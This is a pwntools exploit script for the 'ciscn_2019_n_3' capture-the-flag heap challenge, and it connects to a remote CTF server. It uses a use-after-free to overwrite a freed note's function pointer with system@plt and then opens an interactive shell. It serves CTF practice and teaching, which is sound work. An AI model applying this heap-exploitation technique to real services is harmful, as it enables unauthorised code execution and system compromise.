from pwn import *

elf = ELF('./ciscn_2019_n_3')
context.arch = 'i386'

# r = process(['../../libc/18ld', './ciscn_2019_n_3'],
#            env={'LD_PRELOAD': '../../libc/18'})
r = remote('node3.buuoj.cn', 25900)

INT = 1
STRING = 2


def malloc(index, type, value, length=0):
    r.recvuntil('CNote > ')
    r.sendline('1')
    r.recvuntil('Index > ')
    r.sendline(str(index))
    r.recvuntil('Type > ')
    r.sendline(str(type))
    if type == STRING:
        r.recvuntil('Length > ')
        r.sendline(str(length))
    r.recvuntil('Value > ')
    if type == STRING:
        r.sendline(value)
    else:
        r.sendline(str(value))


def free(index):
    r.recvuntil('CNote > ')
    r.sendline('2')
    r.recvuntil('Index > ')
    r.sendline(str(index))


def show(index):
    r.recvuntil('CNote > ')
    r.sendline('3')
    r.recvuntil('Index > ')
    r.sendline(str(index))


malloc(0, INT, 0xdeadbeef)
malloc(1, INT, 0xdeadbeef)
free(0)
free(1)
malloc(2, STRING, b'sh\x00\x00' + p32(elf.plt['system']), 0xC)
free(0)
r.interactive()
